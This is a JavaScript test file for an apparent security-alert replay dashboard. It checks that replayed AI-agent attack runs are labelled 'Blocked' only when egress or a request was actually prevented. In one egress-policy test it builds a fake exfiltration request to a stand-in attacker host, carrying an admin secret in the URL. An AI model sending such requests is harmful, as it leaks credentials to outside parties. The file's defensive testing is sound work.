// Honest dispositions + stage view without placeholders. Real seams: real T1 stage captures (aim-ab, repo,
// flight), the real T4 sidecar alerts, the real T12 egress policy (inspectEgress -> T4 alertDoc), the real
// T4 buildAlert, the real replayPayload and the real HTTP server.
import { test } from 'node:test';
import assert from 'node:assert/strict';

import { indexCaptures } from '../lib/capture-loader.mjs';
import { adaptAlerts } from '../lib/alert-adapter.mjs';
import { classifyStage, stageAlerts, STAGE_LABEL } from '../lib/stage.mjs';
import { replayPayload, createServer } from '../server.mjs';
import { inspectEgress, loadHoneytokens, makeAllowlist } from '../../egress/policy.mjs';
import { defaultHoneytokens } from '../../egress/inspector.mjs';
import { buildAlert } from '../../alerts/index.js';

const STAGE = [['attack/aim-ab.demo', 'runA', 'runB'], ['attack/repo.demo', 'beat2', 'beat3'], ['attack/flight.demo', 'act2', 'act3']];
const blockedWords = (body) => JSON.stringify({ alerts: body.alerts.map(a => [a.shownDisposition, a.caseCard.narrative]), tl: body.timeline.map(t => t.label), nodes: body.graph.nodes.map(n => n.label) });

test('stage captures, vulnerable run: every alert reads "Detected · post-execution (alert-only)", never Blocked', async () => {
  const index = await indexCaptures();
  let seen = 0;
  for (const [id, vuln] of STAGE) {
    const { status, body } = await replayPayload(index, id, vuln, { dev: true }); // dev: the placeholder alerts are the only alerts today
    assert.equal(status, 200);
    assert.equal(body.run.outcome.exfilExecuted, true, `${id}#${vuln} is the red run`);
    assert.ok(body.alerts.length > 0, `${id}#${vuln} has alerts to check`);
    // The T4 input claims Blocked; that claim must not reach the screen.
    assert.ok(body.alerts.some(a => a.t4Disposition === 'Blocked'), 'fixture really says Blocked');
    for (const a of body.alerts) {
      seen++;
      assert.equal(a.stage, 'post_execution');
      assert.equal(a.shownDisposition, 'Detected · post-execution (alert-only)');
      assert.equal(a.blocked, false);
    }
    // Every alert step comes after the canary-hit step.
    const canaryStep = body.timeline.findIndex(t => t.kind === 'canary_hit');
    const firstAlert = body.timeline.findIndex(t => t.kind === 'alert');
    assert.ok(canaryStep >= 0 && firstAlert > canaryStep, `${id}: alert after canary hit`);
    assert.doesNotMatch(blockedWords(body), /Blocked|blocked by rule/);
    assert.equal(body.metrics.blockedCount, 0);
  }
  assert.ok(seen >= 3);
});

test('stage view (no ?dev=1): stage captures carry no placeholder alerts and no placeholder flag, so the banner is unreachable', async () => {
  const index = await indexCaptures();
  for (const [id, ...runs] of STAGE) {
    for (const run of runs) {
      const { status, body } = await replayPayload(index, id, run, { dev: false });
      assert.equal(status, 200);
      assert.equal(body.capture.placeholder, false);
      assert.equal(body.alertSource.placeholder, false, `${id}#${run}: placeholder sidecar hidden`);
      assert.doesNotMatch(body.alertSource.origin, /fixtures\/alerts/);
    }
  }
  // Placeholder-only captures 404 without dev, and stay replayable with it.
  assert.equal((await replayPayload(index, 'placeholder/data-rich-orders', 'run', { dev: false })).status, 404);
  assert.equal((await replayPayload(index, 'placeholder/data-rich-orders', 'run', { dev: true })).status, 200);
});

test('HTTP: /api/captures and /api/replay hide placeholders unless ?dev=1', async () => {
  const server = createServer();
  await new Promise(r => server.listen(0, '127.0.0.1', r));
  const base = `http://127.0.0.1:${server.address().port}`;
  try {
    const stage = await (await fetch(`${base}/api/captures`)).json();
    assert.ok(stage.captures.length > 0);
    assert.ok(stage.captures.every(c => !c.placeholder && c.source !== 'placeholder'), 'no placeholder in the stage list');
    assert.ok(stage.hiddenPlaceholders >= 2);
    const dev = await (await fetch(`${base}/api/captures?dev=1`)).json();
    assert.ok(dev.captures.some(c => c.source === 'placeholder'));
    const r = await (await fetch(`${base}/api/replay?id=attack/aim-ab.demo&run=runA`)).json();
    assert.equal(r.alertSource.placeholder, false);
    assert.equal(r.alerts.length, 0);
    const rd = await (await fetch(`${base}/api/replay?id=attack/aim-ab.demo&run=runA&dev=1`)).json();
    assert.equal(rd.alertSource.placeholder, true);
    assert.equal((await fetch(`${base}/api/replay?id=placeholder/data-rich-orders&run=run`)).status, 404);
  } finally {
    server.close();
  }
});

test('"Blocked" only for a real egress-boundary deny (T12 inspectEgress in block mode, before any canary hit)', async () => {
  const cfg = (mode) => ({ mode, allow: makeAllowlist(['canary']), honeytokens: loadHoneytokens(defaultHoneytokens()) });
  const req = { kind: 'http', method: 'GET', url: 'http://evil.example:9/x?d=dvaa-admin-secret', host: 'evil.example' };
  const deny = inspectEgress(req, cfg('block'));
  assert.equal(deny.action, 'deny');
  const { alerts } = await adaptAlerts([deny.alertDoc]);
  assert.deepEqual(classifyStage(alerts[0], { canaryHit: false }), { stage: 'prevented_egress', shownDisposition: 'Blocked · egress deny', prevented: true });
  // The same deny on a run where the exfil still landed is not a prevention.
  assert.equal(classifyStage(alerts[0], { canaryHit: true }).stage, 'post_execution');
  // Observe mode forwards: Allowed, alert-only.
  const obs = inspectEgress(req, cfg('observe'));
  const [o] = (await adaptAlerts([obs.alertDoc])).alerts;
  assert.equal(classifyStage(o).stage, 'alert_only');
});

test('"Blocked" for a T3 verdict only with a recorded pre-forward request-side hint; T4 "Blocked" alone is alert-only', async () => {
  const raw = buildAlert({
    category: 'indirect_prompt_injection', ruleId: 'taint.request', disposition: 'block', detectionLatencyMs: 1,
    entities: { agent: { name: 'RAGBot' }, session: { id: 's1' } },
  });
  assert.equal(raw.PatternDispositionDescription, 'Blocked');
  const adapt = async (x) => (await adaptAlerts([x])).alerts[0];
  assert.equal(classifyStage(await adapt(raw)).stage, 'alert_only', 'no direction recorded -> not shown as Blocked');
  assert.equal(classifyStage(await adapt({ ...raw, Direction: 'request', Prevents: true })).stage, 'prevented_request');
  assert.equal(classifyStage(await adapt({ ...raw, Direction: 'request', Prevents: true, PostExecution: true })).stage, 'post_execution');
  assert.equal(classifyStage(await adapt({ ...raw, Direction: 'response', Prevents: true })).stage, 'post_execution');
  assert.equal(classifyStage(await adapt({ ...raw, Direction: 'request', Prevents: false })).stage, 'alert_only');
  // sentinel/pipeline records direction as a narrative prefix.
  const withNarr = (n) => ({ ...raw, CaseCard: { ...raw.CaseCard, Narrative: n } });
  assert.equal(classifyStage(await adapt(withNarr('[request-side · blocking] refused before the agent'))).stage, 'prevented_request');
  assert.equal(classifyStage(await adapt(withNarr('[response-side · alert_only] tool already ran'))).stage, 'post_execution');
  assert.equal(classifyStage(await adapt(withNarr('[request-side · blocking] x')), { canaryHit: true }).stage, 'post_execution');
  // Narrative never says "blocked by rule" for an alert-only verdict.
  const [st] = stageAlerts([await adapt(raw)]);
  assert.doesNotMatch(st.caseCard.narrative, /blocked by rule/);
  assert.equal(st.blocked, false);
  assert.deepEqual(Object.keys(STAGE_LABEL).sort(), ['alert_only', 'post_execution', 'prevented_egress', 'prevented_request']);
});
